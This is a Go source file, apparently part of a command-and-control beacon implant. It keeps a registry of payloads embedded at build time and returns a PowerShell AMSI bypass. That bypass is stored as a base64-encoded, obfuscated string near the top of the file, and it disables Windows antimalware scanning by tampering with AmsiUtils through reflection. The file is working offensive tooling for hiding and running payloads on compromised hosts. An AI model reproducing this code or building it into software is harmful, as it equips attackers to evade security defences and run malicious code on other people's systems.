package payloads

import (
	"encoding/base64"
	"encoding/json"
	"sync"
)

const defaultPowerShellAmsiBypassBase64 = "U2BlVC1JdGBlbSAoICdWJysnYVInICsgJ0lBJyArICgoInsxfXswfSItZicxJywnYmxFOicpKydxMicpICsgKCd1WicrJ3gnKSApICggW1RZcEVdKCAiezF9ezB9Ii1GJ0YnLCdyRScgKSApIDsgKCBHZXQtdmFySWBBYEJMRSAoICgnMVEnKycyVScpICsnelgnICkgLVZhTCApLiJBYHNzYEVtYmx5Ii4iR0VUYFRZYFBlIigoICJ7Nn17M317MX17NH17Mn17MH17NX0iIC1mKCdVdGknKydsJyksJ0EnLCgnQW0nKydzaScpLCgoInswfXsxfSIgLWYgJy5NJywnYW4nKSsnYWdlJysnbWVuJysndC4nKSwoJ3UnKyd0bycrKCJ7MH17Mn17MX0iIC1mICdtYScsJy4nLCd0aW9uJykpLCdzJywoKCJ7MX17MH0iLWYgJ3QnLCdTeXMnKSsnZW0nKSApICkuImdgZXRmYGlFbEQiKCAoICJ7MH17Mn17MX0iIC1mKCdhJysnbXNpJyksJ2QnLCgnSScrKCJ7MH17MX0iIC1mICduaScsJ3RGJykrKCJ7MX17MH0iLWYgJ2lsZScsJ2EnKSkgKSwoICJ7Mn17NH17MH17MX17M30iIC1mICgnUycrJ3RhdCcpLCdpJywoJ05vbicrKCJ7MX17MH0iIC1mJ3VibCcsJ1AnKSsnaScpLCdjJywnYywnICkpLiJzRWBUYFZhTFVFIiggJHtuYFVMbH0sJHt0YFJ1RX0gKQ=="

// BuildPayloadsBase64 and BuildPowerShellAmsiBypassBase64 are populated at build time via ldflags.
var (
	BuildPayloadsBase64             = ""
	BuildPowerShellAmsiBypassBase64 = ""

	initOnce      sync.Once
	payloadLookup map[string]*EmbeddedPayload
	amsiBypass    string
)

// EmbeddedPayload represents a payload stored inside the beacon binary.
type EmbeddedPayload struct {
	Name    string
	Type    string
	Content []byte
}

func initializeRegistry() {
	payloadLookup = make(map[string]*EmbeddedPayload)

	if BuildPayloadsBase64 != "" {
		if decoded, err := base64.StdEncoding.DecodeString(BuildPayloadsBase64); err == nil {
			var definitions []struct {
				Name    string `json:"name"`
				Type    string `json:"type"`
				Content string `json:"content"`
			}

			if err := json.Unmarshal(decoded, &definitions); err == nil {
				for _, definition := range definitions {
					data, err := base64.StdEncoding.DecodeString(definition.Content)
					if err != nil {
						continue
					}
					payloadLookup[definition.Name] = &EmbeddedPayload{
						Name:    definition.Name,
						Type:    definition.Type,
						Content: data,
					}
				}
			}
		}
	}

	// Decode AMSI bypass snippet
	if BuildPowerShellAmsiBypassBase64 != "" {
		if decoded, err := base64.StdEncoding.DecodeString(BuildPowerShellAmsiBypassBase64); err == nil {
			amsiBypass = string(decoded)
		}
	}

	if amsiBypass == "" {
		amsiBypass = defaultPowerShellAmsiBypass()
	}
}

func defaultPowerShellAmsiBypass() string {
	decoded, err := base64.StdEncoding.DecodeString(defaultPowerShellAmsiBypassBase64)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func ensureInitialized() {
	initOnce.Do(initializeRegistry)
}

// GetEmbeddedPayload returns the payload with the provided name, if it exists.
func GetEmbeddedPayload(name string) (*EmbeddedPayload, bool) {
	ensureInitialized()
	payload, ok := payloadLookup[name]
	return payload, ok
}

// ListEmbeddedPayloads returns metadata for all available payloads.
func ListEmbeddedPayloads() []*EmbeddedPayload {
	ensureInitialized()
	results := make([]*EmbeddedPayload, 0, len(payloadLookup))
	for _, payload := range payloadLookup {
		results = append(results, payload)
	}
	return results
}

// GetPowerShellAmsiBypass returns the AMSI bypass snippet configured for PowerShell payload execution.
func GetPowerShellAmsiBypass() string {
	ensureInitialized()
	return amsiBypass
}
